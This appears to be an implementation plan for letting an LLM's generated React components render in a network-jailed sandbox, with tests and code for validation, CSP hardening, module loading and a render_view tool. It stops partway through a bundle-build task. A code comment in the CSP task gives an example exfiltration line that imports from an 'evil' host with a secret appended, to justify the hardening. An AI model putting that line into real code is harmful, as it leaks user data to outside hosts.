# Tier 2.5 — AI-Generated Components in the Tight Sandbox: Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let the LLM emit novel React component code (a `components: name → source` map on `GeneratedPayload`) that evaluates and renders inside the existing egress-jailed F3a sandbox, meshed with catalog components in one tree — and replace the demo's allow-all action policy with the real policy layer.

**Architecture:** Bottom-up through the existing pipeline: `@flowlet/core` (format + validation) → `@flowlet/stage` (CSP hardening, module loading, resolution) → `@flowlet/react` (adapter plumbing) → `@flowlet/agent` (`render_view` tool + engine) → demo-bank (sandbox provisioning, policy, action route). Every layer already exists; this plan extends each seam. Spec: `docs/superpowers/specs/2026-07-01-flowlet-tier25-generated-components-design.md`.

**Tech Stack:** TypeScript, pnpm workspaces + turbo, vitest (unit), Playwright (stage browser gates), Vite (bundle builds), Next.js (demo-bank), Vercel `ai` SDK v6 + zod (agent tool).

**Verify commands (from repo root):**
- Unit: `pnpm --filter @flowlet/core test`, `pnpm --filter @flowlet/stage test`, `pnpm --filter @flowlet/react test`, `pnpm --filter @flowlet/agent test`, `pnpm --filter @flowlet/shell test`, `pnpm --filter demo-bank test`
- Browser gates: `pnpm --filter @flowlet/stage build && pnpm --filter @flowlet/stage test:browser`
- Full: `pnpm build && pnpm test`

---

## File structure (what's created/modified, one line each)

| File | Change |
|---|---|
| `packages/flowlet-core/src/ui.ts` | `UINodeSource` gains `"generated"` |
| `packages/flowlet-core/src/genui/format.ts` | `components` field, caps, name rules, `"generated"` source validation |
| `packages/flowlet-core/src/genui/format.test.ts` | tests for the above |
| `packages/flowlet-core/src/genui/resolve.test.ts` | `"generated"` source passthrough test |
| `packages/flowlet-stage/src/stage-host.ts` | drop `'strict-dynamic'`; `StageInitPayload.generatedComponents` |
| `packages/flowlet-stage/src/stage-host.test.ts` | CSP assertions |
| `packages/flowlet-stage/src/runtime.ts` | generated-module loader, resolution, per-node `flowlet` prop, error sentinels |
| `packages/flowlet-stage/src/runtime.test.ts` | marker tests for the above |
| `packages/flowlet-react/src/stage-adapter.tsx` | structure key includes components; pass `generatedComponents` |
| `packages/flowlet-react/src/stage-adapter.test.tsx` | re-init-on-code-change test |
| `packages/flowlet-agent/src/render-view-tool.ts` | **new** — `render_view` tool |
| `packages/flowlet-agent/src/render-view-tool.test.ts` | **new** — tool tests |
| `packages/flowlet-agent/src/engine.ts` | register `render_view`, export `RENDER_VIEW_TOOL_NAME` |
| `packages/flowlet-agent/src/engine.test.ts` | registration test |
| `packages/flowlet-agent/src/index.ts` | export the new tool + name |
| `packages/flowlet-shell/src/use-flowlet-thread.ts` | suppress `render_view` chips |
| `packages/flowlet-shell/src/use-flowlet-thread.test.ts` | suppression test |
| `packages/flowlet-components/bundle/entry.ts` | **new** — sandbox host-bundle entry |
| `packages/flowlet-components/vite.sandbox.config.ts` | **new** — bundle build (react externalized) |
| `packages/flowlet-components/package.json` | `build:sandbox` script |
| `apps/demo-bank/scripts/copy-flowlet-sandbox.mjs` | **new** — copy bundle + react shim into `public/flowlet/` |
| `apps/demo-bank/package.json` | predev/prebuild hook for the copy script |
| `apps/demo-bank/src/flowlet/policy.ts` | **new** — real composed demo policy |
| `apps/demo-bank/src/flowlet/policy.test.ts` | **new** — policy tests |
| `apps/demo-bank/src/flowlet/action-handler.ts` | **new** — stage action host (policy + execute) |
| `apps/demo-bank/src/flowlet/action-handler.test.ts` | **new** — action host tests |
| `apps/demo-bank/src/app/api/flowlet/action/route.ts` | **new** — POST route wrapping the handler |
| `apps/demo-bank/src/flowlet/agent.ts` | use real policy; `render_view` prompt section |
| `apps/demo-bank/src/components/flowlet/SandboxStage.tsx` | **new** — fetches sources, onAction + approval prompt, mounts FlowletStage |
| `apps/demo-bank/src/components/flowlet/render-node.tsx` | generated nodes → `SandboxStage` |
| `packages/flowlet-stage/tests/browser/fixtures/host.ts` | new `gen-code*` cases |
| `packages/flowlet-stage/tests/browser/gate-generated-code.spec.ts` | **new** — eval/mesh/dispatch/containment gates |
| `packages/flowlet-stage/tests/browser/gate-egress-import.spec.ts` | **new** — remote import()/script-src blocked |
| `README.md`, `apps/demo-bank/README.md` | doc sync |

---

### Task 1: Core format — `"generated"` source + `components` map + validation

**Files:**
- Modify: `packages/flowlet-core/src/ui.ts:1`
- Modify: `packages/flowlet-core/src/genui/format.ts`
- Test: `packages/flowlet-core/src/genui/format.test.ts`
- Test: `packages/flowlet-core/src/genui/resolve.test.ts`

- [ ] **Step 1: Write the failing tests**

Append to `packages/flowlet-core/src/genui/format.test.ts` (follow the existing describe/it style in that file — it tests `validateGeneratedPayload` with small payload literals):

```ts
describe("generated components (Tier 2.5)", () => {
  const base = {
    formatVersion: "flowlet-genui/v1",
    root: "r",
    nodes: [{ id: "r", component: "Gauge", source: "generated" }],
  };
  const CODE = "import React from 'react'; export default function Gauge(){ return React.createElement('div'); }";

  it("accepts a payload whose generated node has a matching components entry", () => {
    const v = validateGeneratedPayload({ ...base, components: { Gauge: CODE } });
    expect(v.ok).toBe(true);
  });

  it("still accepts payloads with no components field (backwards compatible)", () => {
    const v = validateGeneratedPayload({
      formatVersion: "flowlet-genui/v1",
      root: "r",
      nodes: [{ id: "r", component: "Text", source: "prewired" }],
    });
    expect(v.ok).toBe(true);
  });

  it("rejects a generated-source node with no matching components entry", () => {
    const v = validateGeneratedPayload({ ...base, components: {} });
    expect(v.ok).toBe(false);
    if (!v.ok) expect(v.error.code).toBe("provision");
  });

  it("rejects a component name that is not PascalCase-identifier shaped", () => {
    const v = validateGeneratedPayload({
      ...base,
      nodes: [{ id: "r", component: "bad-name", source: "generated" }],
      components: { "bad-name": CODE },
    });
    expect(v.ok).toBe(false);
  });

  it("rejects a component name that shadows a prewired primitive", () => {
    const v = validateGeneratedPayload({
      ...base,
      nodes: [{ id: "r", component: "Text", source: "generated" }],
      components: { Text: CODE },
    });
    expect(v.ok).toBe(false);
    if (!v.ok) expect(v.error.message).toContain("reserved");
  });

  it("rejects non-string component source", () => {
    const v = validateGeneratedPayload({ ...base, components: { Gauge: 42 } });
    expect(v.ok).toBe(false);
  });

  it("enforces the per-component and total source-size caps", () => {
    const big = "x".repeat(MAX_COMPONENT_SOURCE_CHARS + 1);
    const v = validateGeneratedPayload({ ...base, components: { Gauge: big } });
    expect(v.ok).toBe(false);
    if (!v.ok) expect(v.error.message).toContain("source too large");
  });

  it("enforces the component-count cap", () => {
    const components: Record<string, string> = { Gauge: CODE };
    for (let i = 0; i <= MAX_GENERATED_COMPONENTS; i++) components[`C${i}`] = CODE;
    const v = validateGeneratedPayload({ ...base, components });
    expect(v.ok).toBe(false);
  });

  it("accepts source: 'generated' in the node source union", () => {
    // Type-level: ensure the literal compiles as GenNode.
    const n: GenNode = { id: "x", component: "Gauge", source: "generated" };
    expect(n.source).toBe("generated");
  });
});
```

Add the new imports at the top of the test file: `MAX_COMPONENT_SOURCE_CHARS`, `MAX_GENERATED_COMPONENTS`, `GenNode` from `./format`.

Append to `packages/flowlet-core/src/genui/resolve.test.ts`:

```ts
it("preserves source: 'generated' on resolved nodes", () => {
  const tree = resolveGeneratedPayload({
    formatVersion: "flowlet-genui/v1",
    root: "r",
    nodes: [{ id: "r", component: "Gauge", source: "generated" }],
    components: { Gauge: "export default 1" },
  });
  expect(tree.kind).toBe("component");
  if (tree.kind === "component") expect(tree.source).toBe("generated");
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm --filter @flowlet/core test`
Expected: FAIL — `MAX_COMPONENT_SOURCE_CHARS` not exported; source `"generated"` rejected by validator; TS error on `GenNode` source literal.

- [ ] **Step 3: Implement**

`packages/flowlet-core/src/ui.ts:1` — change:

```ts
export type UINodeSource = "prewired" | "host" | "generated";
```

`packages/flowlet-core/src/genui/format.ts` — apply these changes:

```ts
export interface GenNode {
  id: string;
  component: string;
  source?: "prewired" | "host" | "generated";
  props?: Record<string, PropValue>;
  children?: string[];
}

export interface GeneratedPayload {
  formatVersion: string;
  root: string;
  nodes: GenNode[];
  data?: Record<string, unknown>;
  /** Tier 2.5: name → ESM React component source, evaluated in-sandbox. */
  components?: Record<string, string>;
}

/** Names of the prewired primitives shipped inside the stage runtime. The
 *  format reserves them: a generated component may not shadow a primitive. */
export const RESERVED_COMPONENT_NAMES = ["Stack", "Row", "Grid", "Text", "Skeleton"] as const;

/** Caps for generated component code (DoS defense, consistent with MAX_GENUI_NODES). */
export const MAX_GENERATED_COMPONENTS = 16;
export const MAX_COMPONENT_SOURCE_CHARS = 65_536; // 64 KB per component
export const MAX_TOTAL_COMPONENT_CHARS = 262_144; // 256 KB per payload

/** Generated component names: PascalCase identifiers. */
const COMPONENT_NAME_RE = /^[A-Z][A-Za-z0-9]*$/;
```

In `validateGeneratedPayload`, change the source check and add components validation. Replace:

```ts
    if (node.source !== undefined && node.source !== "prewired" && node.source !== "host") {
      return fail("provision", `node "${node.id}" has an invalid source`);
    }
```

with:

```ts
    if (
      node.source !== undefined &&
      node.source !== "prewired" &&
      node.source !== "host" &&
      node.source !== "generated"
    ) {
      return fail("provision", `node "${node.id}" has an invalid source`);
    }
```

After the existing per-node loop (before the `if (!ids.has(root))` check), add:

```ts
  // ── Tier 2.5: generated component code map ─────────────────────────────────
  const components = input.components;
  if (components !== undefined && !isPlainObject(components)) {
    return fail("provision", "components must be a plain object");
  }
  const componentMap = (components ?? {}) as Record<string, unknown>;
  const names = Object.keys(componentMap);
  if (names.length > MAX_GENERATED_COMPONENTS) {
    return fail("provision", `too many generated components (max ${MAX_GENERATED_COMPONENTS})`);
  }
  let totalChars = 0;
  for (const name of names) {
    if (!COMPONENT_NAME_RE.test(name)) {
      return fail("provision", `generated component name "${name}" must be a PascalCase identifier`);
    }
    if ((RESERVED_COMPONENT_NAMES as readonly string[]).includes(name)) {
      return fail("provision", `generated component name "${name}" is reserved (prewired primitive)`);
    }
    const src = componentMap[name];
    if (typeof src !== "string") {
      return fail("provision", `generated component "${name}" source must be a string`);
    }
    if (src.length > MAX_COMPONENT_SOURCE_CHARS) {
      return fail("provision", `generated component "${name}" source too large (max ${MAX_COMPONENT_SOURCE_CHARS} chars)`);
    }
    totalChars += src.length;
  }
  if (totalChars > MAX_TOTAL_COMPONENT_CHARS) {
    return fail("provision", `generated component sources too large in total (max ${MAX_TOTAL_COMPONENT_CHARS} chars)`);
  }
  // A generated-source node must have a definition. Deliberately stricter than
  // dangling child ids (which resolve to Skeleton as a streaming affordance):
  // a missing child may still arrive; a missing definition never will.
  for (const node of nodes) {
    if (
      isPlainObject(node) &&
      (node as Record<string, unknown>).source === "generated" &&
      !(typeof (node as Record<string, unknown>).component === "string" &&
        Object.prototype.hasOwnProperty.call(componentMap, (node as Record<string, unknown>).component as string))
    ) {
      return fail("provision", `node "${(node as Record<string, unknown>).id}" references generated component "${(node as Record<string, unknown>).component}" with no definition in components`);
    }
  }
```

No change to `resolve.ts` code — `source: node.source ?? "prewired"` already passes `"generated"` through once the type union widens.

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm --filter @flowlet/core test`
Expected: PASS (all existing + new).

- [ ] **Step 5: Check downstream type breakage**

Run: `pnpm build`
Expected: `@flowlet/stage`, `@flowlet/react`, `@flowlet/shell`, `@flowlet/components`, `demo-bank` still compile — `UINodeSource` widened; anywhere that exhaustively switches on source must accept `"generated"`. If `genui-host.ts`'s `validateHostProps` or shell/demo code fails to compile, extend the union handling there (behavior for `"generated"` nodes in those paths: treat like `"prewired"` — no registry validation).

- [ ] **Step 6: Commit**

```bash
git add packages/flowlet-core/src
git commit -m "feat(core): GenUI components map + 'generated' node source (Tier 2.5)"
```

---

### Task 2: CSP hardening — drop `'strict-dynamic'`

**Files:**
- Modify: `packages/flowlet-stage/src/stage-host.ts:37-42`
- Test: `packages/flowlet-stage/src/stage-host.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/flowlet-stage/src/stage-host.test.ts` (match its existing imports/style; it already imports `buildSrcdoc`):

```ts
describe("CSP (Tier 2.5 hardening)", () => {
  it("does not include 'strict-dynamic' (remote script-load exfil channel)", () => {
    expect(buildSrcdoc()).not.toContain("strict-dynamic");
  });
  it("allows only nonce'd and blob: scripts", () => {
    const html = buildSrcdoc();
    expect(html).toMatch(/script-src 'nonce-[a-f0-9]+' blob:;/);
  });
  it("keeps connect-src 'none' and default-src 'none'", () => {
    const html = buildSrcdoc();
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("default-src 'none'");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @flowlet/stage test -- stage-host`
Expected: FAIL — srcdoc contains `'strict-dynamic'`.

- [ ] **Step 3: Implement**

In `buildSrcdoc` (`stage-host.ts:39-42`), replace the comment + csp line:

```ts
  // No 'strict-dynamic': it lets trusted scripts dynamically load ANY script
  // URL (allowlists are ignored), which is a data-exfil channel once generated
  // (AI-written) code runs in the realm — import("https://evil?"+secret).
  // All legitimate loading (React shim, host bundle, generated modules) is
  // blob-URL import(), which the explicit blob: source keeps working.
  const csp = `script-src 'nonce-${nonce}' blob:; ${CSP_BASE}`;
```

- [ ] **Step 4: Run unit tests, then the existing browser gates**

Run: `pnpm --filter @flowlet/stage test`
Expected: PASS.

Run: `pnpm --filter @flowlet/stage build && pnpm --filter @flowlet/stage test:browser`
Expected: ALL existing gates PASS — especially `gate-load-csp`, `gate-shared-react` (import-map + blob loading unaffected), `gate-egress`. If a gate fails on blob loading, stop and investigate before proceeding (this is the one risky change; do not weaken back to strict-dynamic without flagging it).

- [ ] **Step 5: Commit**

```bash
git add packages/flowlet-stage/src/stage-host.ts packages/flowlet-stage/src/stage-host.test.ts
git commit -m "fix(stage): drop 'strict-dynamic' from sandbox CSP (blocks remote script-load exfil)"
```

---

### Task 3: Stage runtime — generated module loading, resolution, per-node `flowlet` prop

**Files:**
- Modify: `packages/flowlet-stage/src/runtime.ts`
- Modify: `packages/flowlet-stage/src/stage-host.ts:163-168` (StageInitPayload)
- Test: `packages/flowlet-stage/src/runtime.test.ts`

The runtime is a plain-JS string; unit tests assert source markers (see existing `runtime.test.ts` style), real behavior is proven by the Task 10 browser gates.

- [ ] **Step 1: Write the failing marker tests**

Append to `packages/flowlet-stage/src/runtime.test.ts`:

```ts
describe("generated components (Tier 2.5)", () => {
  it("loads generated component modules per-name with error sentinels", () => {
    for (const marker of [
      "function loadGeneratedComponents(",
      "generatedErrors",
      "cachedGenerated",
      'typeof mod.default === "function"',
    ]) expect(STAGE_RUNTIME_SRC).toContain(marker);
  });
  it("resolves source 'generated' against the generated map with contained errors", () => {
    expect(STAGE_RUNTIME_SRC).toContain('node.source === "generated"');
    expect(STAGE_RUNTIME_SRC).toContain('"data-error": "generated:"');
  });
  it("passes a per-node flowlet.dispatch closure to generated components", () => {
    expect(STAGE_RUNTIME_SRC).toContain("boundProps.flowlet");
    expect(STAGE_RUNTIME_SRC).toContain("window.__flowletDispatch(descriptor, node.id)");
  });
  it("no longer renders the '[generated]' placeholder branch", () => {
    expect(STAGE_RUNTIME_SRC).not.toContain('"[generated]"');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm --filter @flowlet/stage test -- runtime`
Expected: FAIL on all four.

- [ ] **Step 3: Implement in `runtime.ts`**

3a. Add module state near `var cachedHost = null;` (line ~164):

```js
  var cachedGenerated = {};   // name → component fn (loaded generated modules)
  var generatedErrors = {};   // name → error message (load/shape failures)
```

3b. Add the loader after `loadBundle` (line ~46):

```js
  // ── Generated component loader ───────────────────────────────────────────────
  // Loads each entry of { name → ESM source } as a blob module. Failures are
  // contained per-name: a bad module records an error sentinel and the rest of
  // the map still loads (per-node containment downstream, never a blank stage).
  async function loadGeneratedComponents(map) {
    var components = {}, errors = {};
    var names = Object.keys(map || {});
    for (var i = 0; i < names.length; i++) {
      var name = names[i];
      var url = URL.createObjectURL(new Blob([map[name]], { type: "text/javascript" }));
      try {
        var mod = await import(/* @vite-ignore */ url);
        if (mod && typeof mod.default === "function") {
          components[name] = mod.default;
        } else {
          errors[name] = "default export is not a function";
        }
      } catch (err) {
        errors[name] = String(err && err.message || err);
      } finally {
        URL.revokeObjectURL(url);
      }
    }
    return { components: components, errors: errors };
  }
```

3c. In `buildElement`'s `toElement` (line ~168), replace the resolution block and the `[generated]` branch. The full replacement for the body of `toElement`:

```js
    function toElement(node) {
      if (node.kind === "component") {
        var Impl;
        if (node.source === "generated") {
          if (generatedErrors[node.name]) {
            return React.createElement("div", { "data-error": "generated:" + node.name }, "component failed to load");
          }
          Impl = cachedGenerated[node.name];
        } else {
          // Prewired primitives resolve against the built-in PRIMITIVES table first;
          // every other name (incl. prewired __row/__badge) falls back to the host bundle.
          Impl = (node.source === "prewired" && PRIMITIVES[node.name]) ? PRIMITIVES[node.name] : host[node.name];
        }
        if (!Impl) return React.createElement("div", { "data-error": "unknown:" + node.name });
        var boundProps = bindProps(node.props, params.state);
        boundProps.__nodeId = node.id;
        if (node.source === "generated") {
          // Per-node dispatch closure: origin is fixed by the runtime, so generated
          // code cannot pick an originNodeId. (originNodeId is bookkeeping, not a
          // trust boundary — the host policy decides on the ACTION.)
          boundProps.flowlet = {
            dispatch: function(descriptor) { return window.__flowletDispatch(descriptor, node.id); }
          };
        }
        var kids = (node.children || []).map(function(c) { return wrap(c); });
        return kids.length
          ? React.createElement(Impl, boundProps, kids)
          : React.createElement(Impl, boundProps);
      }
      return React.createElement("div", { "data-error": "unresolved-generated:" + node.id });
    }
```

(The final line: a raw `kind:"generated"` node reaching the runtime means the host failed to resolve it — render a contained error, not a fake placeholder.)

3d. In `render(params)` (line ~197), after `cachedHost = await loadBundle(params.bundleSource);` add:

```js
    var gen = await loadGeneratedComponents(params.generatedComponents);
    cachedGenerated = gen.components;
    generatedErrors = gen.errors;
```

3e. In `stage-host.ts`, extend `StageInitPayload`:

```ts
export interface StageInitPayload {
  theme: Record<string, string>;
  state: Record<string, unknown>;
  bundleSource: string;
  tree: UINode;
  /** Tier 2.5: name → ESM component source, loaded as blob modules in-sandbox. */
  generatedComponents?: Record<string, string>;
}
```

(`initialize` already spreads the payload into the RPC call — no other host change.)

3f. Also update the `currentParams` comment at `runtime.ts:17` to `{ theme, state, tree, bundleSource, generatedComponents }`.

- [ ] **Step 4: Run tests**

Run: `pnpm --filter @flowlet/stage test`
Expected: PASS (markers + existing suite; the "is parseable JS" test guards syntax).

- [ ] **Step 5: Commit**

```bash
git add packages/flowlet-stage/src
git commit -m "feat(stage): load + render generated components in-sandbox with per-name containment"
```

---

### Task 4: Stage adapter — structure key + `generatedComponents` pass-through

**Files:**
- Modify: `packages/flowlet-react/src/stage-adapter.tsx`
- Test: `packages/flowlet-react/src/stage-adapter.test.tsx`

- [ ] **Step 1: Write the failing test**

Append to `packages/flowlet-react/src/stage-adapter.test.tsx`, following the file's existing harness (it mounts `FlowletStage` with mocked `@flowlet/stage` exports; reuse its existing mock/controller helpers — read the file's existing tests first and copy their setup pattern):

```tsx
it("re-initializes when only the components map changes (same nodes)", async () => {
  const payload = (code: string) => ({
    id: "g1",
    kind: "generated" as const,
    payload: {
      formatVersion: "flowlet-genui/v1",
      root: "r",
      nodes: [{ id: "r", component: "Gauge", source: "generated" }],
      components: { Gauge: code },
    },
  });
  const { rerender } = render(<FlowletStage node={payload("export default function A(){}")} />);
  await waitForInit(); // reuse the file's existing wait helper for controller.initialize
  const initCallsBefore = mockController.initialize.mock.calls.length;
  rerender(<FlowletStage node={payload("export default function B(){}")} />);
  await waitForInit();
  expect(mockController.initialize.mock.calls.length).toBe(initCallsBefore + 1);
});

it("passes generatedComponents through to initialize", async () => {
  render(<FlowletStage node={payload("export default function A(){}")} />);
  await waitForInit();
  const lastInit = mockController.initialize.mock.calls.at(-1)![0];
  expect(lastInit.generatedComponents).toEqual({ Gauge: "export default function A(){}" });
});
```

(Adapt helper names to the file's actual mock structure — the assertion targets are what matter: a code-only change re-initializes, and `generatedComponents` reaches `initialize`.)

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @flowlet/react test`
Expected: FAIL — same `nodes` means `sameStructure` is true today, so no re-init; and `generatedComponents` is undefined.

- [ ] **Step 3: Implement in `stage-adapter.tsx`**

Replace the structure key (line 20):

```ts
const structureKey = (payload: GeneratedPayload): string =>
  JSON.stringify([payload.nodes, payload.components ?? {}]);
```

Update the `sameStructure` computation (line ~97) to use it:

```ts
          const sameStructure =
            session !== null &&
            prev !== null &&
            prev.formatVersion === payload.formatVersion &&
            prev.root === payload.root &&
            structureKey(prev) === structureKey(payload);
```

Both `c.initialize` calls on the generated path (error tree ~line 116 and success ~line 133) gain the field:

```ts
              c.initialize({ theme, state, bundleSource, tree: errorTree });
```
stays as-is (error tree has no generated code), and:

```ts
            c.initialize({
              theme,
              state,
              bundleSource,
              tree: result.session.tree,
              generatedComponents: payload.components,
            });
```

- [ ] **Step 4: Run tests**

Run: `pnpm --filter @flowlet/react test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add packages/flowlet-react/src
git commit -m "feat(react): stage adapter ships generated component code; code change re-inits"
```

---

### Task 5: Agent — `render_view` tool

**Files:**
- Create: `packages/flowlet-agent/src/render-view-tool.ts`
- Test: `packages/flowlet-agent/src/render-view-tool.test.ts`
- Modify: `packages/flowlet-agent/src/index.ts` (add exports)

- [ ] **Step 1: Write the failing tests**

Create `packages/flowlet-agent/src/render-view-tool.test.ts`:

```ts
import { describe, it, expect, vi } from "vitest";
import { createRenderViewTool } from "./render-view-tool";

const VALID = {
  formatVersion: "flowlet-genui/v1",
  root: "r",
  nodes: [
    { id: "r", component: "Stack", source: "prewired", children: ["g"] },
    { id: "g", component: "Gauge", source: "generated", props: { value: 42 } },
  ],
  components: { Gauge: "import React from 'react'; export default function Gauge(p){ return React.createElement('div', null, p.value); }" },
};

function writerMock() {
  return { write: vi.fn() } as unknown as Parameters<typeof createRenderViewTool>[0];
}

describe("createRenderViewTool", () => {
  it("writes a kind:'generated' data-ui node for a valid payload", async () => {
    const writer = writerMock();
    const tool = createRenderViewTool(writer);
    const result = await tool.execute!(VALID as never, {} as never);
    expect(result).toBe("rendered");
    const written = (writer.write as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(written.type).toBe("data-ui");
    expect(written.data.kind).toBe("generated");
    expect(written.data.payload).toEqual(VALID);
  });

  it("returns the validation error (and writes nothing) for an invalid payload", async () => {
    const writer = writerMock();
    const tool = createRenderViewTool(writer);
    const bad = { ...VALID, components: {} }; // generated node with no definition
    const result = await tool.execute!(bad as never, {} as never);
    expect(String(result)).toContain("error");
    expect((writer.write as ReturnType<typeof vi.fn>).mock.calls.length).toBe(0);
  });

  it("mints unique node ids across calls", async () => {
    const writer = writerMock();
    const tool = createRenderViewTool(writer);
    await tool.execute!(VALID as never, {} as never);
    await tool.execute!(VALID as never, {} as never);
    const calls = (writer.write as ReturnType<typeof vi.fn>).mock.calls;
    expect(calls[0][0].data.id).not.toBe(calls[1][0].data.id);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm --filter @flowlet/agent test -- render-view`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement**

Create `packages/flowlet-agent/src/render-view-tool.ts` (mirror `render-tool.ts`'s structure):

```ts
/**
 * `render_view` — the Tier 2.5 composed-view tool. Where `render_ui` emits ONE
 * component node, `render_view` emits a whole GeneratedPayload: a tree meshing
 * prewired primitives, catalog components, and novel generated component code,
 * rendered in the egress-jailed stage. Validated server-side BEFORE streaming
 * so the model gets a correctable error instead of the user getting a broken node.
 */
import { tool } from "ai";
import type { UIMessageStreamWriter } from "ai";
import { z } from "zod";
import {
  validateGeneratedPayload,
  type FlowletUIMessage,
  type UINode,
} from "@flowlet/core";

type FlowletWriter = UIMessageStreamWriter<FlowletUIMessage>;

const genNodeSchema = z.object({
  id: z.string().describe("Unique node id within this payload."),
  component: z.string().describe("Component name: a prewired primitive (Stack/Row/Grid/Text/Skeleton), a registered catalog component, or a key of `components`."),
  source: z.enum(["prewired", "host", "generated"]).optional()
    .describe("'prewired' (default) for primitives + catalog, 'generated' for a component defined in `components`."),
  props: z.record(z.string(), z.unknown()).optional()
    .describe("Props. A value of { $path: \"/json/pointer\" } binds to `data`."),
  children: z.array(z.string()).optional().describe("Child node ids."),
});

export function createRenderViewTool(writer: FlowletWriter) {
  let counter = 0;

  return tool({
    description:
      "Renders a composed Flowlet view: a tree of prewired primitives, catalog components, and " +
      "optional novel components you define as code. Use for multi-component layouts, data-bound " +
      "views, or UI the catalog cannot express. Generated component code is plain-JS ESM (NO JSX): " +
      "`import React from 'react'` and `export default function MyComp(props) { return React.createElement(...) }`. " +
      "It runs in a network-jailed sandbox; to perform an app action call `props.flowlet.dispatch({ action, payload })`.",
    inputSchema: z.object({
      formatVersion: z.literal("flowlet-genui/v1"),
      root: z.string().describe("Id of the root node."),
      nodes: z.array(genNodeSchema),
      data: z.record(z.string(), z.unknown()).optional()
        .describe("Data model for { $path } prop bindings."),
      components: z.record(z.string(), z.string()).optional()
        .describe("PascalCase name → ESM source for novel components (max 16, 64KB each)."),
    }),
    execute: async (payload) => {
      const validation = validateGeneratedPayload(payload);
      if (!validation.ok) {
        // Model-visible, correctable error; nothing streams to the user.
        return `render_view error (${validation.error.code}): ${validation.error.message}`;
      }
      const node: UINode = {
        id: `view-${++counter}`,
        kind: "generated",
        payload: validation.payload,
      };
      writer.write({ type: "data-ui", id: node.id, data: node });
      return "rendered";
    },
  });
}
```

Add to `packages/flowlet-agent/src/index.ts`, next to the existing render-tool export:

```ts
export { createRenderViewTool } from "./render-view-tool";
```

- [ ] **Step 4: Run tests**

Run: `pnpm --filter @flowlet/agent test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add packages/flowlet-agent/src
git commit -m "feat(agent): render_view tool — emits validated GeneratedPayloads"
```

---

### Task 6: Engine registration + shell chip suppression

**Files:**
- Modify: `packages/flowlet-agent/src/engine.ts:42,163-165`
- Modify: `packages/flowlet-shell/src/use-flowlet-thread.ts:28`
- Test: `packages/flowlet-agent/src/engine.test.ts`, `packages/flowlet-shell/src/use-flowlet-thread.test.ts`

- [ ] **Step 1: Write the failing tests**

`engine.test.ts` — add (following the file's existing mock-model harness for asserting registered tools; find the existing test that asserts `render_ui` is in the toolset and mirror it):

```ts
it("registers render_view beside render_ui", async () => {
  // Reuse the file's existing harness that captures the `tools` passed to streamText.
  const tools = await captureRegisteredTools(); // per the file's existing pattern
  expect(Object.keys(tools)).toContain("render_ui");
  expect(Object.keys(tools)).toContain("render_view");
});
```

`use-flowlet-thread.test.ts` — add (mirror the existing render_ui suppression test):

```ts
it("suppresses render_view tool chips like render_ui", () => {
  const items = toThreadItems([
    {
      id: "m1",
      role: "assistant",
      parts: [{ type: "tool-render_view", toolCallId: "t1", state: "output-available" } as never],
    } as never,
  ]);
  expect(items.find((i) => i.kind === "tool")).toBeUndefined();
});
```

(Adapt the part shape to whatever the existing `render_ui` suppression test uses — copy that test and change the name.)

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm --filter @flowlet/agent test -- engine && pnpm --filter @flowlet/shell test -- use-flowlet-thread`
Expected: both FAIL.

- [ ] **Step 3: Implement**

`engine.ts:42` — add below `RENDER_TOOL_NAME`:

```ts
/** Canonical name of the engine's built-in composed-view tool (Tier 2.5). */
export const RENDER_VIEW_TOOL_NAME = "render_view";
```

`engine.ts` — import and bind the tool (next to step 2's `createRenderTool`):

```ts
import { createRenderViewTool } from "./render-view-tool";
// … inside run(), after `const renderTool = createRenderTool(writer);`:
        const renderViewTool = createRenderViewTool(writer);
```

and register it in the engine source (line ~163):

```ts
          {
            source: "engine",
            tools: {
              ...config.tools,
              [RENDER_TOOL_NAME]: renderTool,
              [RENDER_VIEW_TOOL_NAME]: renderViewTool,
            },
          },
```

`use-flowlet-thread.ts:28` — replace the single-name constant with a set:

```ts
/**
 * Built-in render tool names (mirror `RENDER_TOOL_NAME`/`RENDER_VIEW_TOOL_NAME`
 * in `@flowlet/agent`). Their product is a `data-ui` node, so their tool chips
 * are suppressed to avoid a redundant sliver next to the rendered component.
 */
const RENDER_TOOLS = new Set(["render_ui", "render_view"]);
```

and update the place that compares against `RENDER_UI_TOOL` (search the file for its usage) to `RENDER_TOOLS.has(name)`.

- [ ] **Step 4: Run tests**

Run: `pnpm --filter @flowlet/agent test && pnpm --filter @flowlet/shell test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add packages/flowlet-agent/src packages/flowlet-shell/src
git commit -m "feat(agent,shell): register render_view in the engine; suppress its tool chip"
```

---

### Task 7: Components sandbox bundle + demo asset pipeline

**Files:**
- Create: `packages/flowlet-components/bundle/entry.ts`
- Create: `packages/flowlet-components/vite.sandbox.config.ts`
- Modify: `packages/flowlet-components/package.json` (script + devDep `vite`)
- Create: `apps/demo-bank/scripts/copy-flowlet-sandbox.mjs`
- Modify: `apps/demo-bank/package.json`

This mirrors the stage's own test-fixture pattern (`tests/browser/vite.bundle-ext.config.ts` + `vite.react-shim.config.ts`): an ESM bundle with React **externalized** to the import map, setting the three globals the runtime expects (`runtime.ts:39`).

- [ ] **Step 1: Create the bundle entry**

`packages/flowlet-components/bundle/entry.ts`:

```ts
/**
 * Sandbox host bundle for @flowlet/components. Loaded inside the Flowlet stage
 * via blob import(); React resolves through the stage's import map (shared shim).
 * Sets the three globals the stage runtime expects (see stage runtime loadBundle).
 */
import React from "react";
import { createRoot } from "react-dom/client";
import { prewiredImpls } from "../src/impls";

declare global {
  interface Window {
    __React: typeof React;
    __createRoot: typeof createRoot;
    __FLOWLET_HOST__: Record<string, unknown>;
  }
}

window.__React = React;
